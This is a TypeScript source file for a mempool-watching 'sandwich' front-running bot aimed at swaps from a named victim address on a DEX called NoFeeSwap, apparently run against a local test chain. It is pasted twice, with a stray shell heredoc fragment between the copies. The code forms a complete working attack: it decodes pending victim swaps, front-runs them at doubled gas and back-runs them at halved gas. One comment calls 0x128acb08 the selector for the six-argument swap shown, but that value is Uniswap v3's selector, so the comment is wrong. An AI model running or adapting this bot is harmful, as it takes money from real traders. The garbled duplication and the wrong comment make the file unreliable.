import { ethers } from 'ethers'
import * as dotenv from 'dotenv'
dotenv.config()

// ─── Config ──────────────────────────────────────────────────────────────────
const RPC_URL          = process.env.RPC_URL!
const BOT_PRIVATE_KEY  = process.env.BOT_PRIVATE_KEY!
const VICTIM_ADDRESS   = process.env.VICTIM_ADDRESS!.toLowerCase()
const NOFEESWAP        = process.env.NOFEESWAP_ADDRESS!
const TOKEN0           = process.env.TOKEN0_ADDRESS!
const TOKEN1           = process.env.TOKEN1_ADDRESS!

// ─── ABIs ────────────────────────────────────────────────────────────────────
const SWAP_ABI = [
  'function swap(bytes32 poolId, address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes hookData) returns (int256, int256)',
]
const ERC20_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
]

// swap() selector: first 4 bytes of keccak256("swap(bytes32,address,bool,int256,uint160,bytes)")
const SWAP_SELECTOR = '0x128acb08'  // Uniswap v3 / NFS compatible

// ─── Setup ───────────────────────────────────────────────────────────────────
const provider  = new ethers.JsonRpcProvider(RPC_URL)
const botWallet = new ethers.Wallet(BOT_PRIVATE_KEY, provider)
const swapIface = new ethers.Interface(SWAP_ABI)

// ─── Logging helpers ─────────────────────────────────────────────────────────
const log = (msg: string) => console.log(`[${new Date().toISOString()}] ${msg}`)
const sep = () => console.log('─'.repeat(70))

// ─── Decode swap calldata ─────────────────────────────────────────────────────
interface DecodedSwap {
  poolId: string
  recipient: string
  zeroForOne: boolean
  amountSpecified: bigint
  sqrtPriceLimitX96: bigint
  hookData: string
}

function decodeSwapCalldata(data: string): DecodedSwap | null {
  try {
    const decoded = swapIface.parseTransaction({ data })
    if (!decoded) return null
    return {
      poolId:            decoded.args[0],
      recipient:         decoded.args[1],
      zeroForOne:        decoded.args[2],
      amountSpecified:   BigInt(decoded.args[3]),
      sqrtPriceLimitX96: BigInt(decoded.args[4]),
      hookData:          decoded.args[5],
    }
  } catch {
    return null
  }
}

// ─── Profitability check ──────────────────────────────────────────────────────
function isProfitable(swap: DecodedSwap): boolean {
  // In a real bot: simulate the trade, estimate price impact, compare gas cost
  // Here: any swap > 1 token is considered worth sandwiching
  const absAmount = swap.amountSpecified < 0n
    ? -swap.amountSpecified
    : swap.amountSpecified
  const ONE_TOKEN = ethers.parseUnits('1', 18)
  return absAmount >= ONE_TOKEN
}

// ─── Mine a block (needed since --no-mining is set) ──────────────────────────
async function mineBlock() {
  await provider.send('evm_mine', [])
  log('⛏  Block mined')
}

// ─── Approve token spend for bot ─────────────────────────────────────────────
async function ensureApproval(tokenAddr: string, amount: bigint) {
  const token = new ethers.Contract(tokenAddr, ERC20_ABI, botWallet)
  const tx = await token.approve(NOFEESWAP, amount)
  await tx.wait()
}

// ─── Execute sandwich ─────────────────────────────────────────────────────────
async function executeSandwich(
  victimTxHash: string,
  swap: DecodedSwap,
  victimNonce: number
) {
  sep()
  log(`🎯 SANDWICH TARGET: ${victimTxHash.slice(0, 20)}…`)
  log(`   zeroForOne:  ${swap.zeroForOne}`)
  log(`   amount:      ${ethers.formatUnits(swap.amountSpecified < 0n ? -swap.amountSpecified : swap.amountSpecified, 18)} tokens`)

  const swapContract = new ethers.Contract(NOFEESWAP, SWAP_ABI, botWallet)
  const botNonce     = await provider.getTransactionCount(botWallet.address, 'pending')
  const feeData      = await provider.getFeeData()
  const baseGas      = feeData.gasPrice ?? ethers.parseUnits('1', 'gwei')

  // ── Approve tokens for bot ──────────────────────────────────────────────
  log('🔑 Approving tokens for bot…')
  const approveAmount = ethers.parseUnits('10000', 18)
  const tokenIn  = swap.zeroForOne ? TOKEN0 : TOKEN1
  const tokenOut = swap.zeroForOne ? TOKEN1 : TOKEN0
  await ensureApproval(tokenIn,  approveAmount)
  await ensureApproval(tokenOut, approveAmount)

  // ── Build sqrt price limits ─────────────────────────────────────────────
  const MIN_SQRT = 4295128740n
  const MAX_SQRT = 1461446703485210103287273052203988822378723970341n
  const frontrunSqrt = swap.zeroForOne ? MIN_SQRT : MAX_SQRT
  const backrunSqrt  = swap.zeroForOne ? MAX_SQRT : MIN_SQRT

  // ── FRONT-RUN (higher gas = mines before victim) ────────────────────────
  log('🟢 Sending FRONT-RUN…')
  try {
    const frontrunTx = await swapContract.swap(
      swap.poolId,
      botWallet.address,
      swap.zeroForOne,
      swap.amountSpecified,
      frontrunSqrt,
      '0x',
      {
        nonce:    botNonce,
        gasPrice: baseGas * 2n,   // 2x gas → mines before victim
        gasLimit: 500_000n,
      }
    )
    log(`   Front-run tx: ${frontrunTx.hash}`)
  } catch (e: unknown) {
    log(`   ⚠️  Front-run failed: ${e instanceof Error ? e.message.slice(0, 80) : e}`)
  }

  // ── Mine block so front-run lands before victim ─────────────────────────
  log('⛏  Mining block 1 (front-run + victim)…')
  await mineBlock()

  // ── BACK-RUN (normal gas = mines after victim) ──────────────────────────
  log('🔴 Sending BACK-RUN…')
  try {
    const backrunTx = await swapContract.swap(
      swap.poolId,
      botWallet.address,
      !swap.zeroForOne,             // reverse direction to close position
      swap.amountSpecified,
      backrunSqrt,
      '0x',
      {
        nonce:    botNonce + 1,
        gasPrice: baseGas / 2n,    // lower gas → mines after victim
        gasLimit: 500_000n,
      }
    )
    log(`   Back-run tx:  ${backrunTx.hash}`)
  } catch (e: unknown) {
    log(`   ⚠️  Back-run failed: ${e instanceof Error ? e.message.slice(0, 80) : e}`)
  }

  // ── Mine block so backrun lands ─────────────────────────────────────────
  log('⛏  Mining block 2 (back-run)…')
  await mineBlock()

  sep()
  log('✅ Sandwich complete')

  // ── Print final bot balances ────────────────────────────────────────────
  const t0 = new ethers.Contract(TOKEN0, ERC20_ABI, provider)
  const t1 = new ethers.Contract(TOKEN1, ERC20_ABI, provider)
  const b0 = await t0.balanceOf(botWallet.address)
  const b1 = await t1.balanceOf(botWallet.address)
  log(`   Bot TK0: ${ethers.formatUnits(b0, 18)}`)
  log(`   Bot TK1: ${ethers.formatUnits(b1, 18)}`)
  sep()
}

// ─── Main mempool watcher ─────────────────────────────────────────────────────
async function main() {
  log('🤖 Sandwich bot started')
  log(`   Watching for victim: ${VICTIM_ADDRESS}`)
  log(`   NoFeeSwap:           ${NOFEESWAP}`)
  log(`   Bot wallet:          ${botWallet.address}`)
  sep()

  const processed = new Set<string>()

  // Poll pending transactions every 500ms
  setInterval(async () => {
    try {
      // Get all pending txs from mempool
      const pending = await provider.send('eth_getBlockByNumber', ['pending', true])
      if (!pending?.transactions?.length) return

      for (const tx of pending.transactions as ethers.TransactionResponse[]) {
        if (processed.has(tx.hash)) continue
        if (!tx.to) continue

        // Filter: must be sent TO NoFeeSwap FROM victim
        const isToNFS    = tx.to.toLowerCase() === NOFEESWAP.toLowerCase()
        const isFromVictim = tx.from?.toLowerCase() === VICTIM_ADDRESS
        const isSwap     = tx.data?.startsWith(SWAP_SELECTOR)

        if (!isToNFS || !isFromVictim || !isSwap) continue

        processed.add(tx.hash)
        log(`👀 Pending swap detected!`)
        log(`   From: ${tx.from}`)
        log(`   Hash: ${tx.hash}`)

        // Decode the calldata
        const swap = decodeSwapCalldata(tx.data!)
        if (!swap) {
          log('   ⚠️  Could not decode calldata, skipping')
          continue
        }

        log(`   Decoded: zeroForOne=${swap.zeroForOne}, amount=${ethers.formatUnits(
          swap.amountSpecified < 0n ? -swap.amountSpecified : swap.amountSpecified, 18
        )}`)

        // Check profitability
        if (!isProfitable(swap)) {
          log('   📉 Not profitable, skipping')
          continue
        }

        // Execute sandwich
        const victimNonce = await provider.getTransactionCount(tx.from!, 'pending')
        await executeSandwich(tx.hash, swap, victimNonce)
      }
    } catch (e: unknown) {
      // Silently continue on RPC errors
    }
  }, 500)
}

main().catch(console.error)
EOFmkdir -p src
cat > src/bot.ts << 'EOF'
import { ethers } from 'ethers'
import * as dotenv from 'dotenv'
dotenv.config()

// ─── Config ──────────────────────────────────────────────────────────────────
const RPC_URL          = process.env.RPC_URL!
const BOT_PRIVATE_KEY  = process.env.BOT_PRIVATE_KEY!
const VICTIM_ADDRESS   = process.env.VICTIM_ADDRESS!.toLowerCase()
const NOFEESWAP        = process.env.NOFEESWAP_ADDRESS!
const TOKEN0           = process.env.TOKEN0_ADDRESS!
const TOKEN1           = process.env.TOKEN1_ADDRESS!

// ─── ABIs ────────────────────────────────────────────────────────────────────
const SWAP_ABI = [
  'function swap(bytes32 poolId, address recipient, bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96, bytes hookData) returns (int256, int256)',
]
const ERC20_ABI = [
  'function approve(address spender, uint256 amount) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
]

// swap() selector: first 4 bytes of keccak256("swap(bytes32,address,bool,int256,uint160,bytes)")
const SWAP_SELECTOR = '0x128acb08'  // Uniswap v3 / NFS compatible

// ─── Setup ───────────────────────────────────────────────────────────────────
const provider  = new ethers.JsonRpcProvider(RPC_URL)
const botWallet = new ethers.Wallet(BOT_PRIVATE_KEY, provider)
const swapIface = new ethers.Interface(SWAP_ABI)

// ─── Logging helpers ─────────────────────────────────────────────────────────
const log = (msg: string) => console.log(`[${new Date().toISOString()}] ${msg}`)
const sep = () => console.log('─'.repeat(70))

// ─── Decode swap calldata ─────────────────────────────────────────────────────
interface DecodedSwap {
  poolId: string
  recipient: string
  zeroForOne: boolean
  amountSpecified: bigint
  sqrtPriceLimitX96: bigint
  hookData: string
}

function decodeSwapCalldata(data: string): DecodedSwap | null {
  try {
    const decoded = swapIface.parseTransaction({ data })
    if (!decoded) return null
    return {
      poolId:            decoded.args[0],
      recipient:         decoded.args[1],
      zeroForOne:        decoded.args[2],
      amountSpecified:   BigInt(decoded.args[3]),
      sqrtPriceLimitX96: BigInt(decoded.args[4]),
      hookData:          decoded.args[5],
    }
  } catch {
    return null
  }
}

// ─── Profitability check ──────────────────────────────────────────────────────
function isProfitable(swap: DecodedSwap): boolean {
  // In a real bot: simulate the trade, estimate price impact, compare gas cost
  // Here: any swap > 1 token is considered worth sandwiching
  const absAmount = swap.amountSpecified < 0n
    ? -swap.amountSpecified
    : swap.amountSpecified
  const ONE_TOKEN = ethers.parseUnits('1', 18)
  return absAmount >= ONE_TOKEN
}

// ─── Mine a block (needed since --no-mining is set) ──────────────────────────
async function mineBlock() {
  await provider.send('evm_mine', [])
  log('⛏  Block mined')
}

// ─── Approve token spend for bot ─────────────────────────────────────────────
async function ensureApproval(tokenAddr: string, amount: bigint) {
  const token = new ethers.Contract(tokenAddr, ERC20_ABI, botWallet)
  const tx = await token.approve(NOFEESWAP, amount)
  await tx.wait()
}

// ─── Execute sandwich ─────────────────────────────────────────────────────────
async function executeSandwich(
  victimTxHash: string,
  swap: DecodedSwap,
  victimNonce: number
) {
  sep()
  log(`🎯 SANDWICH TARGET: ${victimTxHash.slice(0, 20)}…`)
  log(`   zeroForOne:  ${swap.zeroForOne}`)
  log(`   amount:      ${ethers.formatUnits(swap.amountSpecified < 0n ? -swap.amountSpecified : swap.amountSpecified, 18)} tokens`)

  const swapContract = new ethers.Contract(NOFEESWAP, SWAP_ABI, botWallet)
  const botNonce     = await provider.getTransactionCount(botWallet.address, 'pending')
  const feeData      = await provider.getFeeData()
  const baseGas      = feeData.gasPrice ?? ethers.parseUnits('1', 'gwei')

  // ── Approve tokens for bot ──────────────────────────────────────────────
  log('🔑 Approving tokens for bot…')
  const approveAmount = ethers.parseUnits('10000', 18)
  const tokenIn  = swap.zeroForOne ? TOKEN0 : TOKEN1
  const tokenOut = swap.zeroForOne ? TOKEN1 : TOKEN0
  await ensureApproval(tokenIn,  approveAmount)
  await ensureApproval(tokenOut, approveAmount)

  // ── Build sqrt price limits ─────────────────────────────────────────────
  const MIN_SQRT = 4295128740n
  const MAX_SQRT = 1461446703485210103287273052203988822378723970341n
  const frontrunSqrt = swap.zeroForOne ? MIN_SQRT : MAX_SQRT
  const backrunSqrt  = swap.zeroForOne ? MAX_SQRT : MIN_SQRT

  // ── FRONT-RUN (higher gas = mines before victim) ────────────────────────
  log('🟢 Sending FRONT-RUN…')
  try {
    const frontrunTx = await swapContract.swap(
      swap.poolId,
      botWallet.address,
      swap.zeroForOne,
      swap.amountSpecified,
      frontrunSqrt,
      '0x',
      {
        nonce:    botNonce,
        gasPrice: baseGas * 2n,   // 2x gas → mines before victim
        gasLimit: 500_000n,
      }
    )
    log(`   Front-run tx: ${frontrunTx.hash}`)
  } catch (e: unknown) {
    log(`   ⚠️  Front-run failed: ${e instanceof Error ? e.message.slice(0, 80) : e}`)
  }

  // ── Mine block so front-run lands before victim ─────────────────────────
  log('⛏  Mining block 1 (front-run + victim)…')
  await mineBlock()

  // ── BACK-RUN (normal gas = mines after victim) ──────────────────────────
  log('🔴 Sending BACK-RUN…')
  try {
    const backrunTx = await swapContract.swap(
      swap.poolId,
      botWallet.address,
      !swap.zeroForOne,             // reverse direction to close position
      swap.amountSpecified,
      backrunSqrt,
      '0x',
      {
        nonce:    botNonce + 1,
        gasPrice: baseGas / 2n,    // lower gas → mines after victim
        gasLimit: 500_000n,
      }
    )
    log(`   Back-run tx:  ${backrunTx.hash}`)
  } catch (e: unknown) {
    log(`   ⚠️  Back-run failed: ${e instanceof Error ? e.message.slice(0, 80) : e}`)
  }

  // ── Mine block so backrun lands ─────────────────────────────────────────
  log('⛏  Mining block 2 (back-run)…')
  await mineBlock()

  sep()
  log('✅ Sandwich complete')

  // ── Print final bot balances ────────────────────────────────────────────
  const t0 = new ethers.Contract(TOKEN0, ERC20_ABI, provider)
  const t1 = new ethers.Contract(TOKEN1, ERC20_ABI, provider)
  const b0 = await t0.balanceOf(botWallet.address)
  const b1 = await t1.balanceOf(botWallet.address)
  log(`   Bot TK0: ${ethers.formatUnits(b0, 18)}`)
  log(`   Bot TK1: ${ethers.formatUnits(b1, 18)}`)
  sep()
}

// ─── Main mempool watcher ─────────────────────────────────────────────────────
async function main() {
  log('🤖 Sandwich bot started')
  log(`   Watching for victim: ${VICTIM_ADDRESS}`)
  log(`   NoFeeSwap:           ${NOFEESWAP}`)
  log(`   Bot wallet:          ${botWallet.address}`)
  sep()

  const processed = new Set<string>()

  // Poll pending transactions every 500ms
  setInterval(async () => {
    try {
      // Get all pending txs from mempool
      const pending = await provider.send('eth_getBlockByNumber', ['pending', true])
      if (!pending?.transactions?.length) return

      for (const tx of pending.transactions as ethers.TransactionResponse[]) {
        if (processed.has(tx.hash)) continue
        if (!tx.to) continue

        // Filter: must be sent TO NoFeeSwap FROM victim
        const isToNFS    = tx.to.toLowerCase() === NOFEESWAP.toLowerCase()
        const isFromVictim = tx.from?.toLowerCase() === VICTIM_ADDRESS
        const isSwap     = tx.data?.startsWith(SWAP_SELECTOR)

        if (!isToNFS || !isFromVictim || !isSwap) continue

        processed.add(tx.hash)
        log(`👀 Pending swap detected!`)
        log(`   From: ${tx.from}`)
        log(`   Hash: ${tx.hash}`)

        // Decode the calldata
        const swap = decodeSwapCalldata(tx.data!)
        if (!swap) {
          log('   ⚠️  Could not decode calldata, skipping')
          continue
        }

        log(`   Decoded: zeroForOne=${swap.zeroForOne}, amount=${ethers.formatUnits(
          swap.amountSpecified < 0n ? -swap.amountSpecified : swap.amountSpecified, 18
        )}`)

        // Check profitability
        if (!isProfitable(swap)) {
          log('   📉 Not profitable, skipping')
          continue
        }

        // Execute sandwich
        const victimNonce = await provider.getTransactionCount(tx.from!, 'pending')
        await executeSandwich(tx.hash, swap, victimNonce)
      }
    } catch (e: unknown) {
      // Silently continue on RPC errors
    }
  }, 500)
}

main().catch(console.error)
